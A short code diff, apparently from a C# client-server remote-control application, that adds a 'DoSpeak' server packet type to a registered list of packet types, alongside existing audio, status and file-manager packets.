@@ -60,6 +60,7 @@ namespace xServer.Core.Packets
                 typeof (Packets.ServerPackets.GetAudioDevices),
                 typeof (Packets.ServerPackets.GetAudioStream),
                 typeof (Packets.ServerPackets.StopAudioStream),
+                typeof (Packets.ServerPackets.DoSpeak),
                 typeof (Packets.ClientPackets.GetAuthenticationResponse),
                 typeof (Packets.ClientPackets.SetStatus),
                 typeof (Packets.ClientPackets.SetStatusFileManager),
